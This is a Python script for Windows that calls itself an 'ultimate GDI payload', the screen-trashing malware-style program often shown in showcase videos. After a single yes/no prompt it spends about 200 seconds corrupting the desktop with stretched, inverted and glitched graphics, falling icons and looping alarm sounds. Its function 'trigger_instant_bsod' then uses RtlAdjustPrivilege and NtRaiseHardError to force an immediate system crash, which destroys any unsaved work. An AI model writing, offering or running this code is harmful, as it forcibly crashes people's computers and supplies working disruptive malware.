import ctypes
import time
import random
import os
import sys
import winsound
import subprocess

# --- Windows API Constants ---
SRCCOPY = 0x00CC0020
SRCINVERT = 0x00660046
PATINVERT = 0x005A0049
DSTINVERT = 0x00550009
NOTSRCERASE = 0x001100A6
MB_YESNO = 0x04
IDYES = 6

# --- Structures for Cursor Capture ---
class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class CURSORINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("flags", ctypes.c_uint),
                ("hCursor", ctypes.c_void_p), ("ptScreenPos", POINT)]

# --- DLL Initialization ---
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
shcore = ctypes.windll.shcore
ntdll = ctypes.windll.ntdll 

try:
    shcore.SetProcessDpiAwareness(1)
except:
    user32.SetProcessDPIAware()

def trigger_instant_bsod():
    """Final Phase: Kernel Override."""
    enabled = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
    response = ctypes.c_ulong()
    ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(response))

def run_gdi_payload():
    # 1. Verification (Old Version Prompt)
    if user32.MessageBoxW(0, "Execute ALL GDI Versions Combined?", "ULTIMATE GDI", MB_YESNO) != IDYES:
        sys.exit()

    # 2. Command Prompt Management (Multi-Window Logic)
    subprocess.Popen("cmd /c timeout /t 2", shell=True)
    subprocess.Popen("cmd /c timeout /t 3", shell=True)

    sw, sh = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    hdc = user32.GetDC(0)
    
    # Load All System Icons
    icons = [user32.LoadIconW(0, 32513), user32.LoadIconW(0, 32515), user32.LoadIconW(0, 32514), user32.LoadIconW(0, 32517)]

    # 3. Phase 1: The Classic Freeze & Shrink (From Version 1)
    for i in range(0, 220, 2):
        gdi32.StretchBlt(hdc, i, i, sw - (i * 2), sh - (i * 2), hdc, 0, 0, sw, sh, SRCCOPY)
        time.sleep(0.04)

    user32.InvalidateRect(0, None, True)
    winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)

    left_y, right_y = -300, -300
    move_offset, move_dir = 0, 1
    start_time = time.time()
    total_duration = 200 # Super Long Cycle

    try:
        while (time.time() - start_time) < total_duration:
            elapsed = (time.time() - start_time)
            
            # --- SHARED CONSTANT EFFECTS (All Versions) ---
            
            # Desktop Displacement Shake (Version 2)
            move_offset = (move_offset + 12 * move_dir)
            if abs(move_offset) > 60: move_dir *= -1
            gdi32.BitBlt(hdc, move_offset, random.randint(-10, 10), sw, sh, hdc, 0, 0, SRCCOPY)

            # Dual Falling Icons 300px (Version 3)
            user32.DrawIconEx(hdc, 50, int(left_y), random.choice(icons), 300, 300, 0, 0, 3)
            user32.DrawIconEx(hdc, sw - 350, int(right_y), random.choice(icons), 300, 300, 0, 0, 3)
            left_y += 12; right_y += 12
            if left_y > sh: left_y = -300
            if right_y > sh: right_y = -300

            # Mouse Cursor Cloning (Version 6)
            ci = CURSORINFO(cbSize=ctypes.sizeof(CURSORINFO))
            if user32.GetCursorInfo(ctypes.byref(ci)):
                user32.DrawIcon(hdc, random.randint(0, sw), random.randint(0, sh), ci.hCursor)

            # --- DYNAMIC COMPOSITE STAGES ---

            # STAGE 1: Classic Paint Spray & Ellipses (0s - 50s)
            if elapsed < 50:
                for _ in range(10):
                    rx, ry = random.randint(0, sw), random.randint(0, sh)
                    brush = gdi32.CreateSolidBrush(random.randint(0, 0xFFFFFF))
                    gdi32.SelectObject(hdc, brush)
                    gdi32.Ellipse(hdc, rx, ry, rx + random.randint(20, 100), ry + random.randint(20, 100))
                    gdi32.DeleteObject(brush)

            # STAGE 2: 3D Perspective Tunnel & XOR (50s - 100s)
            elif elapsed < 100:
                gdi32.StretchBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, sw, sh, SRCCOPY)
                gdi32.BitBlt(hdc, random.randint(-15, 15), random.randint(-15, 15), sw, sh, hdc, 0, 0, SRCINVERT)
                # Rainbow Rectangles
                brush = gdi32.CreateSolidBrush(random.randint(0, 0xFFFFFF))
                gdi32.SelectObject(hdc, brush)
                gdi32.Rectangle(hdc, random.randint(0, sw), random.randint(0, sh), random.randint(0, sw), random.randint(0, sh))
                gdi32.DeleteObject(brush)

            # STAGE 3: Difficult Lines & RGB Melting (100s - 150s)
            elif elapsed < 150:
                # Glitchy BitBlt Lines
                line_x = random.randint(0, sw)
                gdi32.BitBlt(hdc, line_x, random.randint(-30, 30), 100, sh, hdc, line_x, 0, SRCCOPY)
                # Classic Inversion Lines
                pen = gdi32.CreatePen(0, random.randint(1, 5), random.randint(0, 0xFFFFFF))
                gdi32.SelectObject(hdc, pen)
                gdi32.MoveToEx(hdc, random.randint(0, sw), random.randint(0, sh), None)
                gdi32.LineTo(hdc, random.randint(0, sw), random.randint(0, sh))
                gdi32.DeleteObject(pen)

            # STAGE 4: Final Galaxy Reach & RoundRect Chaos (150s - 200s)
            else:
                gdi32.StretchBlt(hdc, -15, -15, sw + 30, sh + 30, hdc, 0, 0, sw, sh, SRCCOPY)
                if random.random() < 0.1:
                    gdi32.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCERASE)
                # New 3D Pie Shapes
                brush = gdi32.CreateSolidBrush(random.randint(0, 0xFFFFFF))
                gdi32.SelectObject(hdc, brush)
                gdi32.Pie(hdc, random.randint(0, sw), random.randint(0, sh), random.randint(0, sw), random.randint(0, sh), 
                          random.randint(0, sw), random.randint(0, sh), random.randint(0, sw), random.randint(0, sh))
                gdi32.DeleteObject(brush)

            # Random Windows Sounds
            if random.random() < 0.05:
                winsound.PlaySound(random.choice(["SystemExclamation", "SystemQuestion"]), winsound.SND_ALIAS | winsound.SND_ASYNC)

            time.sleep(0.03)

    except KeyboardInterrupt:
        pass

    # 4. Final Sequence: Freeze and Crash
    winsound.PlaySound(None, winsound.SND_PURGE)
    print("ULTIMATE CYCLE COMPLETE. SYSTEM OVERRIDE.")
    user32.ReleaseDC(0, hdc)
    
    trigger_instant_bsod()

if __name__ == "__main__":
    os.system("title ULTIMATE COMPOSITE GDI")
    os.system("mode con: cols=100 lines=30")
    run_gdi_payload()